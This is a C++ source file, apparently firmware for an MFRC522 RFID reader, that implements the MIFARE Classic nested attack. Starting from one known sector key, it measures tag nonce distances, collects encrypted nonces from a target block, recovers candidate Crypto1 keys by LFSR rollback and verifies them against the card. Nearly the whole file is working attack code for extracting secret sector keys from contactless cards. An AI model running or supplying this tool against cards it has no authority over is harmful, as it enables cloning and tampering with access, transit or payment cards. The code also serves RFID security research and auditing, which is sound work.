#include "NestedAttack.h"

extern "C" {
#include "utils/crypto/crapto1.h"
}

#include <algorithm>
#include <vector>
#include <cstring>

// --- Tuning parameters ---
static constexpr int DIST_NR   = 10;  // nonce distance samples
static constexpr int TOLERANCE = 15;  // search window around median
static constexpr int SETS_NR   = 3;   // recovery rounds
static constexpr int PROBE_NR  = 3;   // retry probes

// ===================== Low-level helpers =====================

static uint8_t oddparity(uint8_t bt)
{
  return (0x9669 >> ((bt ^ (bt >> 4)) & 0xF)) & 1;
}

static uint64_t bytesToInt(const uint8_t* buf, uint8_t len)
{
  uint64_t nr = 0;
  for (int i = 0; i < len; i++)
    nr = (nr << 8) | buf[i];
  return nr;
}

static uint8_t isNonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, uint8_t* par)
{
  return ((oddparity((Nt >> 24) & 0xFF) == ((par[0]) ^ oddparity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1, 16))) &
          (oddparity((Nt >> 16) & 0xFF) == ((par[1]) ^ oddparity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1,  8))) &
          (oddparity((Nt >>  8) & 0xFF) == ((par[2]) ^ oddparity((NtEnc >>  8) & 0xFF) ^ BIT(Ks1,  0)))) ? 1 : 0;
}

static uint32_t medianOf(uint32_t* a, int len)
{
  std::sort(a, a + len);
  return a[len / 2];
}

// ISO14443-3 CRC-A (software, same as libnfc)
static void calcCRC(const uint8_t* data, uint8_t len, uint8_t* crc)
{
  uint32_t wCrc = 0x6363;
  for (uint8_t i = 0; i < len; i++) {
    uint8_t bt = data[i];
    bt = (bt ^ (uint8_t)(wCrc & 0xFF));
    bt = (bt ^ (bt << 4));
    wCrc = (wCrc >> 8) ^ ((uint32_t)bt << 8) ^ ((uint32_t)bt << 3) ^ ((uint32_t)bt >> 4);
  }
  crc[0] = (uint8_t)(wCrc & 0xFF);
  crc[1] = (uint8_t)((wCrc >> 8) & 0xFF);
}

// ===================== Raw frame encoding =====================
// Interleave data bytes and parity bits (parity-off mode)

static uint8_t makeRawFrame(uint8_t* data, uint8_t dataLen, uint8_t* parBits, uint8_t* pkt)
{
  pkt[0] = data[0];
  pkt[1] = (parBits[0] | (data[1] << 1));
  int i;
  for (i = 2; i < dataLen; i++) {
    pkt[i]  = (parBits[i - 1] << (i - 1)) | (data[i - 1] >> (9 - i));
    pkt[i] |= (data[i] << i);
  }
  pkt[dataLen] = (parBits[dataLen - 1] << (i - 1)) | (data[dataLen - 1] >> (9 - i));
  return dataLen % 8;
}

static void extractData(uint8_t* pkt, uint8_t len, uint8_t* parBits, uint8_t* data)
{
  data[0] = pkt[0];
  int i;
  for (i = 1; i < len - 1; i++) {
    parBits[i - 1] = (pkt[i] & (1 << (i - 1))) >> (i - 1);
    data[i] = (pkt[i] >> i) | (pkt[i + 1] << (8 - i));
  }
  parBits[i - 1] = (pkt[i] & (1 << (i - 1))) >> (i - 1);
}

// ===================== MFRC522 register-level IO =====================
// Bypass the library's normal frame handling for parity-off mode

static void parityOff(MFRC522_I2C* m)
{
  m->PCD_WriteRegister(MFRC522_I2C::MfRxReg, 0x10);
}

static void parityOn(MFRC522_I2C* m)
{
  m->PCD_WriteRegister(MFRC522_I2C::MfRxReg, 0x00);
}

static void resetPICC(MFRC522_I2C* m)
{
  m->PCD_AntennaOff();
  delay(10);
  m->PCD_AntennaOn();
  delay(10);
}

static bool initCom(MFRC522_I2C* m)
{
  for (int attempt = 0; attempt < 20; attempt++) {
    delay(10);
    uint8_t buf[2];
    uint8_t bufSize = sizeof(buf);
    if (m->PICC_RequestA(buf, &bufSize) != MFRC522_I2C::STATUS_OK) continue;
    if (m->PICC_Select(&m->uid) != MFRC522_I2C::STATUS_OK) continue;
    return true;
  }
  return false;
}

// Raw PICC IO: write to FIFO, transceive, read response back into same buffer
static bool piccIO(MFRC522_I2C* m, uint8_t cmd, uint8_t sendLen,
                   uint8_t* data, uint8_t bufLen, uint8_t validBits = 0)
{
  m->PCD_WriteRegister(MFRC522_I2C::CommandReg, MFRC522_I2C::PCD_Idle);
  m->PCD_WriteRegister(MFRC522_I2C::ComIrqReg, 0x7F);
  m->PCD_WriteRegister(MFRC522_I2C::FIFOLevelReg, 0x80); // flush
  m->PCD_WriteRegister(MFRC522_I2C::FIFODataReg, sendLen, data);
  m->PCD_WriteRegister(MFRC522_I2C::BitFramingReg, validBits);
  m->PCD_WriteRegister(MFRC522_I2C::CommandReg, cmd);

  if (cmd == MFRC522_I2C::PCD_Transceive)
    m->PCD_SetRegisterBitMask(MFRC522_I2C::BitFramingReg, 0x80); // StartSend

  uint8_t finishFlag = (cmd == MFRC522_I2C::PCD_Transceive ||
                        cmd == MFRC522_I2C::PCD_Receive) ? 0x30 : 0x10;

  for (int wd = 3000; wd > 0; --wd) {
    uint8_t irq = m->PCD_ReadRegister(MFRC522_I2C::ComIrqReg);
    if (irq & finishFlag) break;
    if (irq & 0x01 || wd == 1) return false; // timeout
  }

  uint8_t err = m->PCD_ReadRegister(MFRC522_I2C::ErrorReg);
  if (err & 0x11) return false; // FIFO overflow or protocol error

  if (cmd == MFRC522_I2C::PCD_Transceive || cmd == MFRC522_I2C::PCD_Receive) {
    uint8_t n = m->PCD_ReadRegister(MFRC522_I2C::FIFOLevelReg);
    if (n > bufLen) return false;
    m->PCD_ReadRegister(MFRC522_I2C::FIFODataReg, n, data);
  }
  return true;
}

// ===================== Manual authentication =====================
// Performs MIFARE auth with parity disabled, returns keystream state

struct AuthContext {
  uint8_t authCmd[4];     // plaintext auth command
  uint8_t encAuthCmd[4];  // encrypted version
  uint8_t authPar[4];     // encrypted parity
};

static bool authenticateManually(MFRC522_I2C* module, uint32_t uid,
                                 uint8_t command, uint8_t blockAddr,
                                 uint32_t* n_T, uint64_t sectorKey,
                                 Crypto1State** outKS, AuthContext* ctx)
{
  uint8_t pkt[9], par[8], data[8];

  parityOff(module);

  // Build plaintext auth command
  ctx->authCmd[0] = command;
  ctx->authCmd[1] = blockAddr;
  calcCRC(ctx->authCmd, 2, &ctx->authCmd[2]);

  for (int i = 0; i < 4; i++)
    par[i] = oddparity(ctx->authCmd[i]);

  uint8_t vb = makeRawFrame(ctx->authCmd, 4, par, pkt);

  // Request tag nonce
  if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) {
    parityOn(module);
    return false;
  }

  extractData(pkt, 5, par, data);
  *n_T = (uint32_t)bytesToInt(data, 4);

  // Init keystream with known key
  *outKS = crypto1_create(sectorKey);
  crypto1_word(*outKS, *n_T ^ uid, 0);

  // Encrypt reader nonce (all zeros)
  uint8_t n_R[4] = {0};
  for (int i = 0; i < 4; i++) {
    data[i] = crypto1_byte(*outKS, n_R[i], 0) ^ n_R[i];
    par[i] = filter((*outKS)->odd) ^ oddparity(n_R[i]);
  }

  *n_T = prng_successor(*n_T, 32);

  // Encrypt reader answer a_R
  for (int i = 4; i < 8; i++) {
    *n_T = prng_successor(*n_T, 8);
    data[i] = crypto1_byte(*outKS, 0x00, 0) ^ (*n_T & 0xFF);
    par[i] = filter((*outKS)->odd) ^ oddparity(*n_T);
  }

  vb = makeRawFrame(data, 8, par, pkt);

  if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 9, pkt, 9, vb)) {
    parityOn(module);
    crypto1_destroy(*outKS);
    *outKS = nullptr;
    return false;
  }

  // Verify tag answer
  extractData(pkt, 5, par, data);
  uint32_t a_T = (uint32_t)bytesToInt(data, 4);
  *n_T = prng_successor(*n_T, 32);
  a_T = crypto1_word(*outKS, 0x00, 0) ^ a_T;

  if (a_T != (*n_T & 0xFFFFFFFF)) {
    parityOn(module);
    crypto1_destroy(*outKS);
    *outKS = nullptr;
    return false;
  }

  return true;
}

// ===================== Nonce distance measurement =====================

static uint32_t measureNonceDistance(MFRC522_I2C* module, uint32_t uid,
                                    uint32_t* n_T, uint64_t sectorKey,
                                    Crypto1State* ks, AuthContext* ctx)
{
  uint8_t pkt[9], data[8], par[8], vb;
  uint32_t distances[DIST_NR];

  for (int i = 0; i < DIST_NR; i++) {
    // Encrypt auth command with current keystream
    for (int j = 0; j < 4; j++) {
      ctx->encAuthCmd[j] = crypto1_byte(ks, 0x00, 0) ^ ctx->authCmd[j];
      ctx->authPar[j] = filter(ks->odd) ^ oddparity(ctx->authCmd[j]);
    }

    vb = makeRawFrame(ctx->encAuthCmd, 4, ctx->authPar, pkt);

    if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) {
      crypto1_destroy(ks);
      parityOn(module);
      return 0;
    }

    extractData(pkt, 5, par, data);
    uint32_t encNonce = (uint32_t)bytesToInt(data, 4);

    // Reinit keystream to decrypt
    crypto1_destroy(ks);
    ks = crypto1_create(sectorKey);

    uint32_t newNonce = encNonce ^ crypto1_word(ks, encNonce ^ uid, 1);
    distances[i] = nonce_distance(*n_T, newNonce);

    // Complete auth handshake (n_R + a_R)
    uint8_t n_R[4] = {0};
    for (int j = 0; j < 4; j++) {
      data[j] = crypto1_byte(ks, n_R[j], 0) ^ n_R[j];
      par[j] = filter(ks->odd) ^ oddparity(n_R[j]);
    }
    *n_T = prng_successor(newNonce, 32);

    for (int j = 4; j < 8; j++) {
      *n_T = prng_successor(*n_T, 8);
      data[j] = crypto1_byte(ks, 0x00, 0) ^ (*n_T & 0xFF);
      par[j] = filter(ks->odd) ^ oddparity(*n_T);
    }

    vb = makeRawFrame(data, 8, par, pkt);
    if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 9, pkt, 9, vb)) {
      crypto1_destroy(ks);
      parityOn(module);
      return 0;
    }

    // Verify tag answer
    *n_T = prng_successor(*n_T, 32);
    extractData(pkt, 5, par, data);
    uint32_t a_T = (uint32_t)bytesToInt(data, 4);
    if ((crypto1_word(ks, 0x00, 0) ^ a_T) != (*n_T & 0xFFFFFFFF)) {
      crypto1_destroy(ks);
      parityOn(module);
      return 0;
    }
  }

  crypto1_destroy(ks);
  return medianOf(distances, DIST_NR);
}

// ===================== Single recovery set =====================
// Collects one encrypted nonce from target block, then recovers candidate keys

static bool recoverSet(MFRC522_I2C* module, uint32_t uid,
                       uint8_t authCmd, uint8_t exploitBlock, uint64_t knownKey,
                       uint8_t targetBlock, uint32_t medianDist,
                       std::vector<uint64_t>& candidates)
{
  uint32_t n_T;
  Crypto1State* ks = nullptr;
  AuthContext ctx;

  parityOn(module);
  resetPICC(module);
  if (!initCom(module)) return false;

  // Authenticate on exploit block
  if (!authenticateManually(module, uid, authCmd, exploitBlock, &n_T, knownKey, &ks, &ctx))
    return false;

  // Send encrypted auth command for TARGET block
  uint8_t unenc[4];
  unenc[0] = authCmd;
  unenc[1] = targetBlock;
  calcCRC(unenc, 2, &unenc[2]);

  uint8_t data[8], par[8], pkt[9];
  for (int i = 0; i < 4; i++) {
    data[i] = crypto1_byte(ks, 0x00, 0) ^ unenc[i];
    par[i] = filter(ks->odd) ^ oddparity(unenc[i]);
  }

  uint8_t vb = makeRawFrame(data, 4, par, pkt);

  if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) {
    crypto1_destroy(ks);
    resetPICC(module);
    return false;
  }

  crypto1_destroy(ks);
  resetPICC(module);

  // Extract encrypted nonce and parity
  extractData(pkt, 5, par, data);
  uint32_t encN_T = (uint32_t)bytesToInt(data, 4);

  uint8_t noncePar[3];
  for (int i = 0; i < 3; i++)
    noncePar[i] = (oddparity(data[i]) != par[i]);

  // Key recovery using nonce distance
  uint32_t guessN_T = prng_successor(n_T, medianDist - TOLERANCE);

  for (int j = (int)(medianDist - TOLERANCE); j <= (int)(medianDist + TOLERANCE); j += 2) {
    uint32_t ks1 = encN_T ^ guessN_T;

    if (isNonce(guessN_T, encN_T, ks1, noncePar)) {
      Crypto1State* revstate = lfsr_recovery32(ks1, guessN_T ^ uid);
      if (!revstate) {
        guessN_T = prng_successor(guessN_T, 2);
        continue;
      }

      Crypto1State* rs = revstate;
      while (rs->odd != 0 || rs->even != 0) {
        lfsr_rollback_word(rs, guessN_T ^ uid, 0);
        uint64_t tmpKey;
        crypto1_get_lfsr(rs, &tmpKey);
        candidates.push_back(tmpKey);
        rs++;
      }
      free(revstate);
    }

    guessN_T = prng_successor(guessN_T, 2);
  }

  return true;
}

// ===================== Verify candidate key =====================

static bool verifyKey(MFRC522_I2C* module, uint8_t authCmd, uint8_t blockAddr,
                      uint64_t candidateKey)
{
  MFRC522_I2C::MIFARE_Key mfKey;
  for (int i = 5; i >= 0; i--) {
    mfKey.keyByte[i] = (uint8_t)(candidateKey & 0xFF);
    candidateKey >>= 8;
  }

  parityOn(module);
  resetPICC(module);
  if (!initCom(module)) return false;

  uint8_t status = module->PCD_Authenticate(authCmd, blockAddr, &mfKey, &module->uid);
  module->PCD_StopCrypto1();
  return (status == MFRC522_I2C::STATUS_OK);
}

// ===================== Main entry point =====================

NestedAttack::Result NestedAttack::crack(
    MFRC522_I2C* module, uint32_t uid,
    uint8_t authCmd, uint8_t exploitBlock, uint64_t knownKey,
    uint8_t targetBlock, ProgressFn progress)
{
  Result result;
  std::vector<uint64_t> allKeys;
  allKeys.reserve(500000);

  for (int probe = 0; probe < PROBE_NR; probe++) {
    if (progress) {
      char msg[48];
      snprintf(msg, sizeof(msg), "Probe %d/%d: measuring...", probe + 1, PROBE_NR);
      if (!progress(msg, probe * 100 / PROBE_NR)) return result;
    }

    // Step 1: Authenticate and measure nonce distance
    uint32_t n_T;
    Crypto1State* ks = nullptr;
    AuthContext ctx;

    parityOn(module);
    resetPICC(module);
    if (!initCom(module)) continue;

    if (!authenticateManually(module, uid, authCmd, exploitBlock, &n_T, knownKey, &ks, &ctx))
      continue;

    uint32_t medDist = measureNonceDistance(module, uid, &n_T, knownKey, ks, &ctx);
    if (medDist == 0) continue;

    resetPICC(module);

    // Step 2: Collect candidate keys from multiple recovery sets
    for (int s = 0; s < SETS_NR; s++) {
      if (progress) {
        char msg[48];
        snprintf(msg, sizeof(msg), "Probe %d: recovering %d/%d", probe + 1, s + 1, SETS_NR);
        int pct = (probe * SETS_NR + s) * 100 / (PROBE_NR * SETS_NR);
        if (!progress(msg, pct)) return result;
      }

      recoverSet(module, uid, authCmd, exploitBlock, knownKey,
                 targetBlock, medDist, allKeys);
    }

    if (allKeys.empty()) continue;

    // Step 3: Sort and find most-frequent candidates
    std::sort(allKeys.begin(), allKeys.end());

    uint64_t topKeys[10] = {0};
    int maxCount = 0, idx = 0;

    for (size_t i = 0; i < allKeys.size();) {
      size_t run = 1;
      while (i + run < allKeys.size() && allKeys[i + run] == allKeys[i])
        run++;
      if ((int)run > maxCount) {
        maxCount = (int)run;
        if (idx > 9) idx = 0;
        topKeys[idx++] = allKeys[i];
      }
      i += run;
    }

    // Step 4: Verify top candidates
    if (progress) {
      char msg[48];
      snprintf(msg, sizeof(msg), "Verifying %zu keys...", allKeys.size());
      if (!progress(msg, 90)) return result;
    }

    for (int d = 9; d >= 0; d--) {
      if (topKeys[d] == 0) continue;

      if (verifyKey(module, authCmd, targetBlock, topKeys[d])) {
        result.success = true;
        result.key = topKeys[d];
        parityOn(module);
        return result;
      }
    }

    allKeys.clear();
  }

  parityOn(module);
  return result;
}
